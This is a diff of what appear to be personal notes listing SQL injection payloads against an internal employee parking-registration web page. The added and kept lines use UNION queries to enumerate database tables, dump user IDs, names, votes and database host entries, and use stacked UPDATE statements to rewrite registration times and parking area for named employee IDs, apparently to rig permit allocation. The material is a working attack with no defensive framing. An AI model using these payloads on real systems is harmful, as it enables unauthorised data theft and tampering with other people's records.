@@ -93,15 +93,22 @@ http://slc.pvgl.sap.corp:1080/register/facility/employee/index.asp
 
    I074192' UNION ALL select 1, 'a', 'b', 'c', 'd', 'e', 'f', 2, 3, 4, 5 --
 
-   I074192' UNION ALL select 1, table_name, column_name, 'c', 'd', 'e', 'f', 2, 3, 4, 5 from information_schema.columns where table_name = 'Facility'--
+   I058712' UNION ALL select 1, table_name, column_name, 'c', 'd', 'e', 'f', 2, 3, 4, 5 from information_schema.columns where table_name = 'Facility_Result' --
    
    I074192' UNION ALL select 1, table_name, column_name, 'c', 'd', 'e', 'f', 2, 3, 4, 5 from information_schema.columns where table_name = 'parking_permit' --
 
    I074192' UNION ALL select 1, table_name, column_name, 'c', 'd', 'e', 'f', 2, 3, 4, 5 from information_schema.columns where table_name = 'C_reguser' --
    
-   I074192' UNION ALL select 1, userid, username, 'c', 'd', 'e', 'f', regtime, 3, 4, 5 from Facility where userid='I046147'--
+   I058712' UNION ALL select top 192 1, userid, username, 'c', 'd', 'e', 'f', regtime, 3, 4, ParkingArea from Facility where ParkingArea = 'PVG06' --
+I058808 
 
-   I074192'; Update Facility set logintime = '2016/1/12 11:20:24', regtime = '2016/1/12 11:20:53', ParkingArea='PVG06' where userid = 'I067652' --
+   I058712' UNION ALL select 1, userid, vote, 'c', 'd', 'e', 'f', logintime, 3, 4, 5 from Facility_Result --
+
+   I058712'; Update Facility set logintime = '2016/1/13 14:30:01', regtime = '2016/1/13 14:33:03', ParkingArea='PVG06' where userid = 'I046147' --
+
+I058712'; Update Facility set logintime = '2016/1/19 11:29:11', regtime = '2016/1/19 11:31:23', ParkingArea='PVG06' where userid = 'I302650' --
+
+I058712'; Update Facility set logintime = '2016/1/13 14:32:23', regtime = '2016/1/13 14:34:41', ParkingArea='PVG06' where userid = 'I067652' --
 
    I074192' UNION ALL select 1, Host, 'b', 'c', 'd', 'e', 'f', 2, 3, 4, 5 from mysql.user --
 #+END_SRC
